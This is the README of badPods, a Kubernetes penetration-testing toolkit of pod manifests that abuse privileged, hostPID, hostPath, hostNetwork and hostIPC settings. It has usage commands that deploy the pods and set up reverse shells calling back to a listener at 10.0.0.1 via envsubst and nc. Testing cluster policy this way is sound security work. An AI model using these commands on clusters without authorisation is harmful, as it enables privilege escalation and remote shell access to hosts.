# badPods

A collection of manifests that create pods with different elevated privileges. Quickly demonstrate the impact of allowing security sensitive pod attributes like `hostNetwork`, `hostPID`, `hostPath`, `hostIPC`, and `privileged`. 

## Background 
Check out blog post here

## Prerequisites
1. Access to a cluster 
1. RBAC permission to create one of the following resource types in at least one namespace: 
   * CronJob, DeamonSet, Deployment, Job, Pod, ReplicaSet, ReplicationController, StatefulSet
1. RBAC permission to exec into pods or a network policy that allows a reverse shell from a pod to reach you. 
1. No pod security policy enforcement, or a policy that allows pods to be created with one or more security sensitive attributes

## The badPods line-up

Type | Usage and Post Exploitation | Pod Manifest
-- | -- | -- 
Everything allowed | [readme](manifests/everything-allowed/) | [manifest](manifests/everything-allowed/everything-allowed.yaml) 
Privileged and hostPid | [readme](manifests/priv-and-hostpid/) | [manifest](manifests/priv-and-hostpid/pod-priv-and-hostpid.yaml) 
Privileged only | [readme](manifests/priv/) | [manifest](manifests/priv/pod-priv.yaml) 
hostPath only | [readme](manifests/hostpath/) | [manifest](manifests/hostpath/hostpath-exec.yaml) 
hostPid only | [readme](manifests/hostpid/) | [manifest](manifests/hostpid/hostpid.yaml) 
hostNetwork only | [readme](manifests/hostnetwork/) | [manifest](manifests/hostnetwork/hostnetwork-exec.yaml) 
hostIPC only | [readme](manifests/hostipc/) | [manifest](manifests/hostipc/hostipc-exec.yaml) 
Nothing allowed | [readme](manifests/nothing-allowed/) | [manifest](manifests/nothing-allowed/nothing-allowed.yaml) 

# Impact - What's the worst that can happen?
Check out blog post here

# Organization
* 128 self-contained, ready to use manifests. Why so many?
   * 8 badPods (hostpid, hostnetwork, everything-allowed, etc.)
   * 8 resource types that can create pods (pod, deployment, replicaset, statefulset, etc.)
   * 2 ways to access the created pods (exec & reverse shell)

```
├── manifests
│   ├── everything-allowed
│   │   ├── cronjob
│   │   │   ├── everything-allowed-exec-cronjob.yaml
│   │   │   └── everything-allowed-revshell-cronjob.yaml
│   │   ├── deamonset
│   │   │   ├── everything-allowed-exec-deamonset.yaml
│   │   │   └── everything-allowed-revshell-deamonset.yaml
│   │   ├── deployment
│   │   │   ├── everything-allowed-exec-deployment.yaml
│   │   │   └── everything-allowed-revshell-deployment.yaml
│   │   ├── job
│   │   │   ├── everything-allowed-exec-job.yaml
│   │   │   └── everything-allowed-revshell-job.yaml
│   │   ├── pod
│   │   │   ├── everything-allowed-exec-pod.yaml
│   │   │   └── everything-allowed-revshell-pod.yaml
│   │   ├── replicaset
│   │   │   ├── everything-allowed-exec-replicaset.yaml
│   │   │   └── everything-allowed-revshell-replicaset.yaml
│   │   ├── replicationcontroller
│   │   │   ├── everything-allowed-exec-replicationcontroller.yaml
│   │   │   └── everything-allowed-revshell-replicationcontroller.yaml
│   │   └── statefulset
│   │       ├── everything-allowed-exec-statefulset.yaml
│   │       └── everything-allowed-revshell-statefulset.yaml
│   ├── hostipc
│   │   ├── cronjob
│   │   │   ├── hostipc-exec-cronjob.yaml
│   │   │   └── hostipc-revshell-cronjob.yaml
│   │   ├── deamonset
│   │   │   ├── hostipc-exec-deamonset.yaml
│   │   │   └── hostipc-revshell-deamonset.yaml
...omitted for brevity...
```

### "There are Eight ways to create a Pod"
As [Eviatar Gerzi (@g3rzi)](https://twitter.com/g3rzi) points out in the post [Eight Ways to Create a Pod](https://www.cyberark.com/resources/threat-research-blog/eight-ways-to-create-a-pod), there are 8 different controllers that create a pod, or a set of pods.  You might not be authorized to create pods, but you can create another resource type that will create one or more pods. For each badPod type, there are manifests that correspond to all eight resource types. 

### Reverse shells
While common, it is not always the case that you can exec into pods that you can create. To help in those situations, a version of each manifest is included that will call back to your listener as soon as the pod is created. 

# Usage
Each resource in the `manifests` directory targets a specific attribute or a combination of attributes that expose the cluster to risk when allowed. 

## High level approach

#### Option 1: Methodical approach
1. **Evaluate RBAC** - Determine which resource types you can create 
1. **Evaluate Admission Policy** - Determine which of the badPods you will be able to create
1. **Create Resources** - Based on what is allowed, use the specific badPod type and resource type and create your resources
1. **Post Exploitation** - Evaluate post exploitation steps outlined in the README for that type

#### Option 2: Shotgun approach
1. **Create Resources** - Just start applying different manifests and see what works
1. **Post Exploitation** - For any created pods, evaluate post exploitation steps outlined in the README for that type


## Usage Examples

* [Create all eight badPods](#Create-all-eight-badPods-if-the-admission-controller-allows-it)
* [Create all eight revsere shell badPods](#Create-all-eight-revsere-shell-badPods)
* [Create all eight resource types using the everything-allowed pod](#Create-all-eight-resource-types-using-the-everything-allowed-pod)
* [Create a cronjob with the hostNetwork pod](#Create-a-cronjob-with-the-hostNetwork-pod)
* [Create a deployment with the priv-and-hostpid pod](#Create-a-deployment-with-the-priv-and-hostpid-pod)
* [Create a reverse shell using the privileged pod](#Create-a-reverse-shell-using-the-privileged-pod)


### Create all eight badPods (if the admission controller allows it)
```
kubectl apply -f ./manifests/everything-allowed/pod/everything-allowed-exec-pod.yaml
kubectl apply -f ./manifests/priv-and-hostpid/pod/priv-and-hostpid-exec-pod.yaml
kubectl apply -f ./manifests/priv/pod/priv-exec-pod.yaml
kubectl apply -f ./manifests/hostpath/pod/hostpath-exec-pod.yaml
kubectl apply -f ./manifests/hostpid/pod/hostpid-exec-pod.yaml
kubectl apply -f ./manifests/hostnetwork/pod/hostnetwork-exec-pod.yaml
kubectl apply -f ./manifests/hostipc/pod/hostipc-exec-pod.yaml
kubectl apply -f ./manifests/nothing-allowed/pod/nothing-allowed-exec-pod.yaml
```
### Create all eight revsere shell badPods
To avoid having to edit each pod with your host and port, you can environment variables and the `envsubst` command. Remember to spin up all of your listeners first!

```
HOST="10.0.0.1" PORT="3111" envsubst < ./manifests/everything-allowed/pod/everything-allowed-revshell-pod.yaml | kubectl apply -f -
HOST="10.0.0.1" PORT="3112" envsubst < ./manifests/priv-and-hostpid/pod/priv-and-hostpid-revshell-pod.yaml | kubectl apply -f -
HOST="10.0.0.1" PORT="3113" envsubst < ./manifests/priv/pod/priv-revshell-pod.yaml | kubectl apply -f -
HOST="10.0.0.1" PORT="3114" envsubst < ./manifests/hostpath/pod/hostpath-revshell-pod.yaml | kubectl apply -f -
HOST="10.0.0.1" PORT="3115" envsubst < ./manifests/hostpid/pod/hostpid-revshell-pod.yaml  | kubectl apply -f -
HOST="10.0.0.1" PORT="3116" envsubst < ./manifests/hostnetwork/pod/hostnetwork-revshell-pod.yaml | kubectl apply -f -
HOST="10.0.0.1" PORT="3117" envsubst < ./manifests/hostipc/pod/hostipc-revshellv-pod.yaml | kubectl apply -f -
HOST="10.0.0.1" PORT="3118" envsubst < ./manifests/nothing-allowed/pod/nothing-allowed-revshell-pod.yaml | kubectl apply -f -
```
### Create a cronjob with the hostNetwork pod
```
kubectl apply -f manifests/hostnetwork/cronjob/hostnetwork-exec-cronjob.yaml
```

Find the created pod
```
kubectl get pods | grep cronjob
 
NAME                                        READY   STATUS    RESTARTS   AGE
hostnetwork-exec-cronjob-1607351160-gm2x4   1/1     Running   0          24s
```

Exec into pod
```
kubectl exec -it hostnetwork-exec-cronjob-1607351160-gm2x4 -- bash
```

### Create a deployment with the priv-and-hostpid pod
```
kubectl apply -f manifests/priv-and-hostpid/deployment/priv-and-hostpid-exec-deployment.yaml
```
Find the created pod
```
kubectl get pods | grep deployment

priv-and-hostpid-exec-deployment-65dbfbf947-qwpz9   1/1     Running   0          56s
priv-and-hostpid-exec-deployment-65dbfbf947-tghqh   1/1     Running   0          56s
```
Exec into pod
```
kubectl exec -it priv-and-hostpid-exec-deployment-65dbfbf947-qwpz9 -- bash
```

### Create all eight resource types using the everything-allowed pod
```
find manifests/everything-allowed/ -name \*-exec-*.yaml -exec kubectl apply -f {} \;

cronjob.batch/everything-allowed-exec-cronjob created
daemonset.apps/everything-allowed-exec-deamonset created
deployment.apps/everything-allowed-exec-deployment created
job.batch/everything-allowed-exec-job created
pod/everything-allowed-exec-pod created
replicaset.apps/everything-allowed-exec-replicaset created
replicationcontroller/everything-allowed-exec-replicationcontroller created
service/everything-allowed-exec-statefulset-service created
statefulset.apps/everything-allowed-exec-statefulset created
```

View all of the created pods
```
kubectl get pods

NAME                                                  READY   STATUS    RESTARTS   AGE
everything-allowed-exec-deamonset-qbrdb               1/1     Running   0          52s
everything-allowed-exec-deployment-6cd7685786-rp65h   1/1     Running   0          51s
everything-allowed-exec-deployment-6cd7685786-m66bl   1/1     Running   0          51s
everything-allowed-exec-job-fhsbt                     1/1     Running   0          50s
everything-allowed-exec-pod                           1/1     Running   0          50s
everything-allowed-exec-replicaset-tlp8v              1/1     Running   0          49s
everything-allowed-exec-replicaset-6znbz              1/1     Running   0          49s
everything-allowed-exec-replicationcontroller-z9k8n   1/1     Running   0          48s
everything-allowed-exec-replicationcontroller-m4648   1/1     Running   0          48s
everything-allowed-exec-statefulset-0                 1/1     Running   0          47s
everything-allowed-exec-statefulset-1                 1/1     Running   0          42s
```
Delete all everything-allowed resources
```
find manifests/everything-allowed/ -name \*-exec-*.yaml -exec kubectl delete -f {} \;
```

### Create a reverse shell using the privileged pod
Set up listener
```
nc -nvlp 3116
```

Create pod from local yaml without modifying it by using env variables and envsubst
```
HOST="10.0.0.1" PORT="3116" envsubst < ./yaml/priv/pod-priv-revshell.yaml | kubectl apply -f -
```
Catch the shell 
```
nc -nvlp 3116
Listening on 0.0.0.0 3116

Connection received on 10.0.0.162 42035
```

# Contributing
Have you run into a situation where there was a restrictive policy, but you were still able to gain elevated access with only a subset of privileges or capabilities? If so, please consider sharing the yaml and the privesc steps, and we'll add it as a new badPod type. 

# Acknowledgements 
Thank you [Rory McCune](https://twitter.com/raesene), [Duffie Cooley](https://twitter.com/mauilion), [Brad Geesaman](https://twitter.com/bradgeesaman), [Tabitha Sable](https://twitter.com/tabbysable), [Ian Coldwater](https://twitter.com/IanColdwater), [Mark Manning](https://twitter.com/antitree), and [Eviatar Gerzi](https://twitter.com/g3rzi) for publicly sharing so much knowledge about Kubernetes offensive security. 
